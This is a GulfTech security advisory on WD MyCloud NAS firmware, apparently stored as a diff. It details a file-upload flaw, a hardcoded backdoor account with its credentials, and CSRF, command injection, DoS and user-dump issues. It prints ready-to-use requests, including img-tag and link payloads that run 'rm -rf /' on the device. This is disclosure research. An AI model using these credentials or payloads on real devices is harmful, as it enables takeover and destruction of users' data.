@@ -1,0 +1,506 @@
+WDMyCloud Multiple Vulnerabilities
+Vendor: Western Digital
+Product: WDMyCloud
+Version: <= 2.30.165
+Website: https://www.wdc.com/products/network-attached-storage.html
+
+
+###########################################################################
+                     ______      ____________          __  
+                    / ____/_  __/ / __/_  __/__  _____/ /_ 
+                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
+                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
+                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
+                                                                
+                     GulfTech Research and Development                                                                 
+
+###########################################################################
+#             WDMyCloud <= 2.30.165 Multiple Vulnerabilities              #
+###########################################################################
+
+Released Date: 2018-01-04
+Last Modified: 2017-06-11
+ Company Info: Western Digital
+ Version Info: 
+              Vulnerable
+               MyCloud <= 2.30.165
+               MyCloudMirror <= 2.30.165
+               My Cloud Gen 2
+               My Cloud PR2100
+               My Cloud PR4100
+               My Cloud EX2 Ultra
+               My Cloud EX2
+               My Cloud EX4
+               My Cloud EX2100
+               My Cloud EX4100
+               My Cloud DL2100
+               My Cloud DL4100
+
+              Not Vulnerable
+               MyCloud 04.X Series
+ 
+
+--[ Table of contents
+
+00 - Introduction
+    00.1 Background
+
+01 - Unrestricted file upload
+    01.1 - Vulnerable code analysis
+    01.2 - Remote exploitation
+
+02 - Hard coded backdoor
+    02.1 - Vulnerable code analysis
+    02.2 - Remote exploitation
+
+03 - Miscellaneous security issues
+    03.1 - Cross site request forgery
+    03.2 - Command injection
+    03.3 - Denial of service
+    03.4 - Information disclosure
+
+04 - Reused Code
+
+05 - Credit
+
+06 - Proof of concept
+
+07 - Disclosure timeline
+
+08 - Solution
+
+09 - Contact information
+
+10 - References
+
+
+--[ 00 - Introduction
+
+The purpose of this article is to detail the research that I have completed 
+regarding the Western Digital MyCloud family of devices.
+
+Several serious security issues were uncovered during my research. 
+Vulnerabilities such as pre auth remote root code execution, as well as a 
+hardcoded backdoor admin account which can NOT be changed. The backdoor 
+also allows for pre auth remote root code execution on the affected device.
+
+The research was conducted on both a WDMyCloud 4TB and a WDMyCloudMirror
+16TB with the latest available firmware 2.30.165. My research shows that
+the 04 branch of the WDMyCloud firmware is not vulnerable to these issues.
+
+--[ 00.1 - Background
+
+WD My Cloud is a personal cloud storage unit to organize your photos and 
+videos. It is currently the best selling NAS (network attached storage)
+device listed on the amazon.com website, and is used by individuals and
+businesses alike.  It's purpose is to host your files, and it also has the
+ability to sync them with various cloud and web based services.
+
+
+--[ 01 - Unrestricted file upload
+
+The WDMyCloud device is vulnerable to an unrestricted file upload 
+vulnerability within the following file:
+
+/usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php
+
+The root of the problem here is due to the misuse and misunderstanding of
+the PHP gethostbyaddr() function used within PHP, by the developer of this 
+particular piece of code. From the PHP manual this functions return values 
+are defined as the following for gethostbyaddr():
+
+"Returns the host name on success, the unmodified ip_address on failure, or 
+FALSE on malformed input."
+
+With a brief overview of the problem, let's have a look at the offending 
+code in order to get a better understanding of what is going on with this 
+particular vulnerability.
+
+--[ 01.1 - Vulnerable code analysis
+
+Below is the code from the vulnerable "multi_uploadify.php" script. You can
+see that I have annoted the code to explain what is happening.
+
+#BUG 01: Here the attacker controlled "Host" header is used to define the 
+remote auth server. This is by itself really bad, as an attacker could
+easily just specify that the host be the IP address of a server that they
+are in control of. But, if we send it an invalid "Host" header it will just
+simply return FALSE as defined in the PHP manual.
+
+$ip = gethostbyaddr($_SERVER['HTTP_HOST']);
+$name = $_REQUEST['name'];
+$pwd = $_REQUEST['pwd'];
+$redirect_uri =  $_REQUEST['redirect_uri']; 
+
+//echo $name ."
+".$pwd."
+".$ip;
+
+#BUG 02: At this point, this request should always fail. The $result
+variable should now be set to FALSE.
+
+$result = @stripslashes( @join( @file( "http://".$ip."/mydlink/mydlink.cgi?
+cmd=1&name=".$name."=&pwd=".$pwd ),"" ));
+
+#BUG 03: Here an empty haystack is searched, and thus strstr() returns a
+value of FALSE.
+
+$result_1 = strstr($result,"0");
+$result_1 = substr ($result_1, 0,28);  
+
+#BUG 04: The strncmp() call here is a strange one. It looks for a specific
+login failure. So, it never accounts for when things go wrong or slightly
+unexpected. As a result this "if" statement will always be skipped.
+
+if (strncmp ($result_1,"0",28) == 0 )
+//if (strstr($result,"0")== 0 )
+{
+    header("HTTP/1.1 302 Found");
+  header("Location: ".$redirect_uri."?status=0");
+  exit();   
+}
+
+#BUG 05: At this point all checks have been passed, and an attacker can use
+this issue to upload any file to the server that they want.
+
+The rest of the source code was omitted for the sake of breivity, but it 
+just handles the file upload logic once the user passes the authentication
+checks.
+
+--[ 01.2 - Remote exploitation
+
+Exploiting this issue to gain a remote shell as root is a rather trivial
+process. All an attacker has to do is send a post request that contains a 
+file to upload using the parameter "Filedata[0]", a location for the file 
+to be upload to which is specified within the "folder" parameter, and of 
+course a bogus "Host" header.
+
+I have written a Metasploit module to exploit this issue. The module will
+use this vulnerability to upload a PHP webshell to the "/var/www/"
+directory. Once uploaded, the webshell can be executed by requesting a URI
+pointing to the backdoor, and thus triggering the payload.
+
+
+--[ 02 - Hard coded backdoor
+
+After finding the previously mentioned file upload vulnerability I decided
+to switch gears and start reversing the CGI binaries that were accessable
+via the web interface. The CGI binaries are standard Linux ELF executables
+and pretty easy to go through. Within an hour of starting I stumbled 
+across the following file located at:
+
+/usr/local/modules/cgi/nas_sharing.cgi
+
+The above file can be accessed by visiting "/cgi-bin/nas_sharing.cgi" but 
+it produces server errors with every single method, except when the "cmd"
+parameter was set to "7". This piqued my interest and so I really started
+digging into the binary, as it seemed very buggy and possibly vulnerable.
+
+As it turns out the error was caused due to buggy code and nothing I was or 
+wasn't doing wrong. But, while I was figuring out the cause of the error I 
+happened to come across the following function that is used to authenticate 
+the remote user. 
+
+--[ 02.1 - Vulnerable code analysis
+
+Below is the psuedocode created from the disassembly of the binary. I have
+renamed the function to "re_BACKDOOR" to visually identify it more easily.
+
+struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2)
+{
+  const char *v2; // r5@1
+  const char *v3; // r4@1
+  struct passwd *result; // r0@4
+  FILE *v5; // r6@5
+  struct passwd *v6; // r5@7
+  const char *v7; // r0@9
+  size_t v8; // r0@10
+  int v9; // [sp+0h] [bp-1090h]@1
+  char s; // [sp+1000h] [bp-90h]@1
+  char dest; // [sp+1040h] [bp-50h]@1
+
+  v2 = a2;
+  v3 = a1;
+  memset(&s, 0, 0x40u);
+  memset(&dest, 0, 0x40u);
+  memset(&v9, 0, 0x1000u);
+  if ( *v2 )
+  {
+    v8 = strlen(v2);
+    _b64_pton(v2, (u_char *)&v9, v8);
+    if ( dword_2C2E4 )
+    {
+      sub_1194C((const char *)&unk_1B1A4, v2);
+      sub_1194C("pwd decode[%s]\n", &v9);
+    }
+  }
+  if (!strcmp(v3, "mydlinkBRionyg") 
+  &&  !strcmp((const char *)&v9, "abc12345cba") )
+  {
+    result = (struct passwd *)1;
+  }
+  else
+  {
+    v5 = (FILE *)fopen64("/etc/shadow", "r");
+    while ( 1 )
+    {
+      result = fgetpwent(v5);
+      v6 = result;
+      if ( !result )
+        break;
+      if ( !strcmp(result->pw_name, v3) )
+      {
+        strcpy(&s, v6->pw_passwd);
+        fclose(v5);
+        strcpy(&dest, (const char *)&v9);
+        v7 = (const char *)sub_1603C(&dest, &s);
+        return (struct passwd *)(strcmp(v7, &s) == 0);
+      }
+    }
+  }
+  return result;
+}
+
+As you can see in the above code, the login functionality specifically
+looks for an admin user named "mydlinkBRionyg" and will accept the password
+of "abc12345cba" if found. This is a classic backdoor. Simply login with 
+the credentials that I just mentioned from the above code.
+
+Also, it is peculiar that the username is "mydlinkBRionyg", and that the 
+vulnerability in Section 1 of this paper refers to a non existent file name
+of "mydlink.cgi" but, more about that later in section 4...
+
+--[ 02.2 - Remote exploitation
+
+At first, to the untrained eye, exploiting this backdoor to do useful
+things may seem problematic due to the fact that only method "7" gives us
+no error. And, method 7 only allows us the ability to download any files in 
+"/mnt/", but no root shell. But, we want a root shell. Right?
+
+After digging deeper I realized that the CGI script was dying every time, 
+but only at the final rendering phase due to what seems like an error where 
+the programmer forgot to specify the content type header on output, thus 
+confusing the webserver and causing the crash. So, everything we do gets 
+executed up until that point successfully. It is just blind execution.
+
+Now that I had that figured out I started looking for a method I could then
+exploit to gain shell access. I started with method "51" because it was the 
+first one I looked at. This particular method happened to contain a command 
+injection issue. Now I easily could turn this backdoor into a root 
+shell, and gain control of the affected device.
+
+GET /cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMT
+IzNDVjYmE&start=1&count=1;touch+/tmp/gulftech; HTTP/1.1
+
+By sending a request like the one above a remote attacker could now execute
+any commands as root. And yes, the password is base64 encoded, as that is
+what the script expects. In the example above I simply create a file called 
+"gulftech" located in the "/tmp/" directory.
+
+The triviality of exploiting this issues makes it very dangerous, and even
+wormable. Not only that, but users locked to a LAN are not safe either. An
+attacker could literally take over your WDMyCloud by just having you visit
+a website where an embedded iframe or img tag make a request to the 
+vulnerable device using one of the many predictable default hostnames for
+the WDMyCloud such as "wdmycloud" and "wdmycloudmirror" etc.
+
+<img src="http://wdmycloud/cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlin
+kBRionyg&passwd=YWJjMTIzNDVjYmE&start=1&count=1;rm+-rf+/;">
+
+For example simply visiting the above link will totally destroy a WDMyCloud
+without the need for any type of authentication whatsoever, and there is 
+nothing you can do about it except delete the file as the credentials are 
+hardcoded into the binary itself.
+
+
+--[ 03 - Miscellaneous vulnerabilities
+
+In addition to the two previously mentioned critical vulnerabilities were
+also several other issues. These other issues are still very dangerous, but
+require authentication in some cases, and for the most part are not 
+considered as critical, and also require less technical explanation. 
+
+--[ 03.1 - Cross site request forgery
+
+There is no real XSRF protection within the WDMyCloud web interface. This
+can have quite the impact on unsuspecting users. Exploitation of this issue 
+is trivial.
+
+http://wdmycloud/web/dsdk/DsdkProxy.php?;rm -rf /;
+
+For example, if a logged in WDMyCloud admin visits, or is forced to visit
+the above link, then the entire device will be wiped out. This is just one
+of many XSRF issues. We do not have time to track them all down.
+
+--[ 03.2 - Command injection
+
+Some time ago, a researcher from the "Exploiteers" team found an alarming
+number of command injection issues within the WDMyCloud. Unfortunately, we 
+were able to find quite a few as well.
+
+class RemoteBackupsAPI{
+    public function getRecoverItems()
+    {
+        $xmlPath = "/var/www/xml/rsync_recover_items.xml";
+        $jobName = $_REQUEST['jobName'];
+        
+        @unlink($xmlPath);
+        
+        $cmd = "rsyncmd -l \"$xmlPath\" -r \"$jobName\" >/dev/null";
+        system($cmd);
+        
+        if (file_exists($xmlPath))
+        {
+            print file_get_contents($xmlPath);
+        }
+        else
+        {
+            print "";
+        }
+    }
+}
+
+The above code is an example of the type of command injection issues that
+still plague the WDMyCloud. This particular command injection is post auth,
+as were all of the other command injections I found too. However, I did not 
+have time to sift through looking for all of these. And by now I feel 
+that the manufacturer should know better considering they just went through 
+the process of patching many command injection vulnerabilities disclosed by 
+the Exploiteers.[1]
+
+--[ 03.3 - Denial of service
+
+It is possible for an attacker to abuse language preferences functionality
+in order to cause a DoS to the web interface. This is due to the fact that
+any unauthenticated user can set the global language preferences for the
+entire device and all of its users. The psuedocode from the disassembled 
+binary can be seen below.
+
+int cgi_language()
+{
+  int v1; // [sp+0h] [bp-10h]@1
+
+  cgiFormString("f_language", &v1, 8);
+  xml_set_str((int)"/language", (int)&v1);
+  xml_write_file("/etc/NAS_CFG/config.xml");
+  LIB_CP_Config_To_MTD(1);
+  cgiHeaderContentType("text/html");
+  return system("language.sh > /dev/null 2>&1 &");
+}
+
+This is not a very useful attack vector since we only have 8 bytes to work 
+with. But, you can make a script that keeps randomly resetting the language 
+to some random language and it will affect all users of the device and 
+requires no authentication. It is very hard to use the device if it is 
+rendering all of the pages in a language you can not understand.
+
+http://wdmycloud/cgi-bin/login_mgr.cgi?cmd=cgi_language&f_language=7
+
+The above example request sets the language to korean. There are 17 
+available language codes. Details can be found in language.sh located on 
+the target device.
+
+--[ 03.4 - Information disclosure
+
+It is possible for an attacker to dump a list of all users, including
+detailed user information.
+
+GET /api/2.1/rest/users? HTTP/1.1
+
+Making a simple request to the webserver like the one above will dump the
+user information to an attacker for all users. This does not require any 
+authentication in order to take advantage of.
+
+
+--[ 04 - D-Link DNS-320L ShareCenter
+
+As I have mentioned earlier in this article, I found it peculiar that 
+the username used for the backdoor is "mydlinkBRionyg", and that the 
+vulnerability in Section 1 of this paper refers to a non existent file name
+of "mydlink.cgi". This really piqued my curiosity, and so I started using
+google to try to track down some leads. After searching for the term of
+"mydlink.cgi" I came across a reference to a post made by a D-Link user
+regarding their D-Link DNS-320L ShareCenter NAS device.[2]
+
+Within that post were references to file names and directory structure that
+were fairly unique, and from the D-link device. But, they also perfectly 
+matched my WDMyCloud device. The more I looked into this the weirder it 
+seemed. So, I gained access to a D-Link DNS-320L ShareCenter. Once I had it 
+things became pretty clear to me as the D-Link DNS-320L had the same exact 
+hard coded backdoor and same exact file upload vulnerability that was 
+present within the WDMyCloud. So, it seems that the WDMyCloud software 
+shares a large amount of the D-Link DNS-320L code, backdoor and all. There 
+are also other undeniable examples such as misspelled function names and 
+other anomalies that match up within both the WDMyCloud and the D-Link 
+DNS-320L ShareCenter code.
+
+It should be noted that unlike the WDMyCloud the D-Link DNS-320L is 
+currently NOT vulnerable to the backdoor and file upload issues, so you 
+should upgrade your DNS-320L firmware as soon as possible as the issues can
+be leveraged to gain a remote root shell on the DNS-320L if you are not up
+to date with your device firmware. The backdoor was first removed in the 
+1.0.6 firmware release. (July 28, 2014)
+
+It is interesting to think about how before D-Link updated their software 
+two of the most popular NAS device families in the world, sold by two of 
+the most popular tech companies in the world were both vulnerable at the 
+same time, to the same backdoor for a while. The time frame in which both 
+devices were vulnerable at the same time in the wild was roughly from early 
+2014 to later in 2014 based on comparing firmware release note dates.
+
+
+--[ 05 - Credit
+
+James Bercegay
+GulfTech Research and Development
+
+
+--[ 06 - Proof of concept
+
+We strive to do our part to contribute to the security community.
+Metasploit modules for issues outlined in this paper can be found online.
+
+
+--[ 07 - Disclosure timeline
+
+2017-06-10
+Contacted vendor via web contact form. Assigned case #061117-12088041.
+
+2017-06-12
+Support member Gavin referred us to WDC PSIRT. We immediately sent a PGP
+encrypted copy of our report to WDC PSIRT.
+
+2017-06-13
+Recieved confirmation of report from Samuel Brown.
+
+2017-06-16
+A period of 90 days is requested by vendor until full disclosure.
+
+2017-12-15
+Zenofex posts disclosure of the upload bug independantly of my research [3]
+
+2018-01-03
+Public Disclosure
+
+
+--[ 08 - Solution
+
+N/A
+
+
+--[ 09 - Contact information
+
+Web
+https://gulftech.org/
+
+Mail
+security@gulftech.org
+
+
+--[ 10 - References
+
+[1] https://blog.exploitee.rs/2017/hacking_wd_mycloud/
+[2] http://forums.dlink.com/index.php?topic=65415.0
+[3] https://www.exploitee.rs/index.php/Western_Digital_MyCloud
+
+Copyright 2018 GulfTech Research and Development. All rights reserved.
